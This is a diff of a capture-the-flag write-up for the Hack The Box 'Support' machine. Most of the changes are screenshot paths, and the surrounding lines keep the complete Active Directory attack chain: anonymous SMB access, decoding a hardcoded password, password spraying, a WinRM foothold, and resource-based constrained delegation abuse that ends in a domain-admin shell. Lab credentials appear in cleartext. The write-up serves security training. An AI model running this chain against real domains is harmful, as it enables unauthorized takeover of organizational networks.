@@ -43,7 +43,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.11.142
 ```
 
-![ping](support_01_ping.png)
+![ping](screenshots/support_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -61,7 +61,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.11.142 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](support_02_nmap_allports.png)
+![allports](screenshots/support_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -69,7 +69,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](support_03_extractports.png)
+![extractports](screenshots/support_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -85,7 +85,7 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted](support_04_nmap_targeted.png)
+![targeted](screenshots/support_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -119,7 +119,7 @@ The domain name **support.htb** appears in script/output (per the solved notes).
 smbclient -L 10.129.11.142 -N
 ```
 
-![smb list](support_05_smbclient_list.png)
+![smb list](screenshots/support_05_smbclient_list.png)
 
 Identify where anonymous access allows listing or reading:
 
@@ -127,7 +127,7 @@ Identify where anonymous access allows listing or reading:
 smbmap -H 10.129.11.142 -u none
 ```
 
-![smbmap](support_06_smbmap.png)
+![smbmap](screenshots/support_06_smbmap.png)
 
 **Recovered (relationship):** besides **`IPC$`**, the non-default **`support-tools`** share is reachable (per notes).
 
@@ -140,7 +140,7 @@ Connect to **`support-tools`** without a password, pull **`UserInfo.exe.zip`**, 
 smbclient //10.129.11.142/support-tools -N
 ```
 
-![smb support-tools](support_07_smb_support_tools.png)
+![smb support-tools](screenshots/support_07_smb_support_tools.png)
 
 Inside the session, download the archive:
 
@@ -154,7 +154,7 @@ Unpack:
 unzip UserInfo.exe.zip
 ```
 
-![unzip userinfo](support_08_unzip_userinfo.png)
+![unzip userinfo](screenshots/support_08_unzip_userinfo.png)
 
 ---
 ### 2.3 UserInfo configuration and strings
@@ -165,13 +165,13 @@ Inspect the **.config** for connection strings or secrets, then extract **Unicod
 cat UserInfo.exe.config
 ```
 
-![userinfo config](support_09_userinfo_config.png)
+![userinfo config](screenshots/support_09_userinfo_config.png)
 
 ```bash
 strings -e l UserInfo.exe
 ```
 
-![strings userinfo](support_10_strings_userinfo.png)
+![strings userinfo](screenshots/support_10_strings_userinfo.png)
 
 **Recovered (from notes):** references such as **`LDAP://support.htb`**, the username **armando**, material suggesting **`support\ldap`**, and an encoded blob that later maps to the **`ldap`** account.
 
@@ -186,7 +186,7 @@ Create a small `users` file containing `ldap` (per the solved notes), then run:
 kerbrute userenum -d support.htb --dc 10.129.11.142 users
 ```
 
-![kerbrute ldap](support_11_kerbrute_ldap.png)
+![kerbrute ldap](screenshots/support_11_kerbrute_ldap.png)
 
 Broader enumeration:
 
@@ -194,7 +194,7 @@ Broader enumeration:
 kerbrute userenum -d support.htb --dc 10.129.11.142 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
 
-![kerbrute xato](support_12_kerbrute_xato.png)
+![kerbrute xato](screenshots/support_12_kerbrute_xato.png)
 
 ---
 ## 3. Foothold
@@ -203,9 +203,9 @@ kerbrute userenum -d support.htb --dc 10.129.11.142 /usr/share/seclists/Username
 
 Open **`UserInfo.exe`** in **ILSpy** (or equivalent) and locate the logic behind the encoded value observed in **`strings`**. The solved notes rebuild a short **Python** decoder:
 
-![ilspy overview](support_13_ilspy_overview.png)
+![ilspy overview](screenshots/support_13_ilspy_overview.png)
 
-![ilspy search](support_14_ilspy_search.png)
+![ilspy search](screenshots/support_14_ilspy_search.png)
 
 We found a password. LetÂ´s create a decoder in python to obtain the result:
 
@@ -224,7 +224,7 @@ for e,k in zip(enc_password, cycle(key)):
 print(res)
 ```
 
-![ilspy decoder](support_15_ilspy_decoder.png)
+![ilspy decoder](screenshots/support_15_ilspy_decoder.png)
 
 Run the script and capture the **`ldap`** password output:
 
@@ -232,7 +232,7 @@ Run the script and capture the **`ldap`** password output:
 python3 decoder.py
 ```
 
-![decoder output](support_16_decoder_output.png)
+![decoder output](screenshots/support_16_decoder_output.png)
 
 **Recovered:** save the cleartext password for **`ldap`** (per decoder output in the notes) into **`passwords`** for tooling.
 
@@ -242,7 +242,7 @@ Validate **SMB** authentication for **`ldap`**:
 crackmapexec smb 10.129.11.142 -u 'ldap' -p passwords
 ```
 
-![cme smb ldap](support_17_cme_smb_ldap.png)
+![cme smb ldap](screenshots/support_17_cme_smb_ldap.png)
 
 Check **WinRM** for the same pair (expect no shell if not granted remote access):
 
@@ -250,7 +250,7 @@ Check **WinRM** for the same pair (expect no shell if not granted remote access)
 crackmapexec winrm 10.129.11.142 -u 'ldap' -p passwords
 ```
 
-![cme winrm ldap](support_18_cme_winrm_ldap.png)
+![cme winrm ldap](screenshots/support_18_cme_winrm_ldap.png)
 
 ---
 ### 3.2 Validating ldap and hunting support
@@ -263,7 +263,7 @@ rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.129.11.142
 # enumdomgroups
 ```
 
-![rpcclient](support_19_rpcclient_enumerate.png)
+![rpcclient](screenshots/support_19_rpcclient_enumerate.png)
 
 Export usernames for spraying (regex pipeline from notes):
 
@@ -271,7 +271,7 @@ Export usernames for spraying (regex pipeline from notes):
 rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.129.11.142 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users
 ```
 
-![enumdomusers](support_20_enumdomusers.png)
+![enumdomusers](screenshots/support_20_enumdomusers.png)
 
 Spray the **`ldap`** password across collected users over **SMB**:
 
@@ -279,7 +279,7 @@ Spray the **`ldap`** password across collected users over **SMB**:
 crackmapexec smb 10.129.11.142 -u users -p passwords --continue-on-success
 ```
 
-![cme spray](support_21_cme_spray.png)
+![cme spray](screenshots/support_21_cme_spray.png)
 
 Query **LDAP** for the **`support`** user and inspect attributes (notes focus on the **`info`** field):
 
@@ -287,7 +287,7 @@ Query **LDAP** for the **`support`** user and inspect attributes (notes focus on
 ldapsearch -x -H ldap://10.129.11.142 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -i "samaccountname: support" -B 40
 ```
 
-![ldapsearch support](screenshots/support_23_ldapsearch_support.png)
+![ldapsearch support](screenshots/support_22_ldapsearch_support.png)
 
 **Recovered (from notes):** the **`info`** attribute contains **`Ironside47pleasure40Watchful`**, treated as **`support`**â€™s password for validation.
 
@@ -297,7 +297,7 @@ Confirm **WinRM** access for **`support`**:
 crackmapexec winrm 10.129.11.142 -u 'support' -p 'Ironside47pleasure40Watchful'
 ```
 
-![cme support winrm 1](support_23_cme_support_winrm.png)
+![cme support winrm 1](screenshots/support_23_cme_support_winrm.png)
 
 ---
 ### 3.3 Initial shell as support
@@ -308,7 +308,7 @@ Open an interactive **WinRM** session as **`support`** and read **`user.txt`**:
 evil-winrm -i 10.129.11.142 -u 'support' -p 'Ironside47pleasure40Watchful'
 ```
 
-![evil-winrm user](support_24_evil_winrm_user.png)
+![evil-winrm user](screenshots/support_24_evil_winrm_user.png)
 
 ðŸ **User flag obtained**
 
@@ -323,7 +323,7 @@ Confirm identity, attempt **Administrator**-only actions if needed, and review g
 whoami /groups
 ```
 
-![groups](support_25_groups.png)
+![groups](screenshots/support_25_groups.png)
 
 We need to escalate to **Domain Administrator**. For **AD** environments, **BloodHound** is the best tool to map trust relationships and identify privilege escalation paths.
 
@@ -336,7 +336,7 @@ We collect **AD** data from our attacking machine using the **Python**-based col
 bloodhound-python -d support.htb -u 'support' -p 'Ironside47pleasure40Watchful' -gc dc.support.htb -c all -ns 10.129.11.142
 ```
 
-![bloodhound files](support_26_bloodhound_files.png)
+![bloodhound files](screenshots/support_26_bloodhound_files.png)
 
 This generates **JSON** files with **AD** relationships (users, groups, computers, domains, etc.).
 
@@ -346,13 +346,13 @@ We start **BloodHound Community Edition** with Docker:
 curl -L https://ghst.ly/getbhce | docker compose -f - up
 ```
 
-![bloodhound password](support_27_bloodhound_password.png)
+![bloodhound password](screenshots/support_27_bloodhound_password.png)
 
 The logs show the initial admin password. We open `http://localhost:8080`, log in, and upload the **JSON** files.
 
 Using the **Pathfinding** feature from `SUPPORT@SUPPORT.HTB` to `ADMINISTRATOR@SUPPORT.HTB`:
 
-![bloodhound pathfinding](support_28_bloodhound_pathfinding.png)
+![bloodhound pathfinding](screenshots/support_28_bloodhound_pathfinding.png)
 
 The graph supports the privilege path used next (membership and **DC**-object abuse):
 
@@ -371,7 +371,7 @@ Import-Module .\Powermad.ps1
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![powermad](support_29_powermad_machineaccount.png)
+![powermad](screenshots/support_29_powermad_machineaccount.png)
 
 Use **PowerView**-style cmdlets (per notes: import PowerView (https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1), then):
 
@@ -381,7 +381,7 @@ Import-Module .\PowerView.ps1
 Get-DomainComputer SERVICEA
 ```
 
-![get domain computer](support_30_get_domain_computer_servicea.png)
+![get domain computer](screenshots/support_30_get_domain_computer_servicea.png)
 
 **Prerequisite for `impacket-rbcd -action write`:** the **computer object** **`SERVICEA$`** must **exist in AD** (created by **`New-MachineAccount`** above). If **`Get-DomainComputer SERVICEA`** returns nothing or errors, **stop** â€” rerun **Powermad** **`New-MachineAccount`** in **WinRM** until it succeeds, then confirm again. **`impacket-rbcd`** looks up **`-delegate-from`** by **sAMAccountName**; **`User not found in LDAP: SERVICEA$`** means the machine account was never created, was deleted, or uses a **different name** (use that exact **`â€¦$`** name in **`-delegate-from`**).
 
@@ -399,7 +399,7 @@ Verify **`SERVICEA$`** is listed:
 impacket-rbcd 'support.htb/support:Ironside47pleasure40Watchful' -delegate-to 'DC$' -action read -dc-ip 10.129.11.142
 ```
 
-![rbcd verify](support_31_rbcd_msds_allowedtoact.png)
+![rbcd verify](screenshots/support_31_rbcd_msds_allowedtoact.png)
 
 ---
 ### 4.4 Delegation abuse to Administrator
@@ -411,13 +411,13 @@ sudo timedatectl set-ntp off
 sudo rdate -n 10.129.11.142
 ```
 
-![time sync](support_32_clock_sync_getst.png)
+![time sync](screenshots/support_32_clock_sync_getst.png)
 
 ```bash
 impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.11.142 support.htb/SERVICEA$:123456
 ```
 
-![getst](support_33_getst.png)
+![getst](screenshots/support_33_getst.png)
 
 Point **Impacket** at the **ccache** (path matches the file **`getST`** writes in the current directory) and open a shell on the **DC**:
 
@@ -439,7 +439,7 @@ echo "10.129.11.142 dc.support.htb support.htb" | sudo tee -a /etc/hosts
 impacket-psexec -k dc.support.htb
 ```
 
-![psexec](support_34_psexec_shell.png)
+![psexec](screenshots/support_34_psexec_shell.png)
 
 Retrieve **`root.txt`** from **Administrator**â€™s desktop:
 
@@ -448,7 +448,7 @@ cd C:\Users\Administrator\Desktop
 type root.txt
 ```
 
-![root flag](support_35_root_flag.png)
+![root flag](screenshots/support_35_root_flag.png)
 
 ðŸ **Root flag obtained**
 
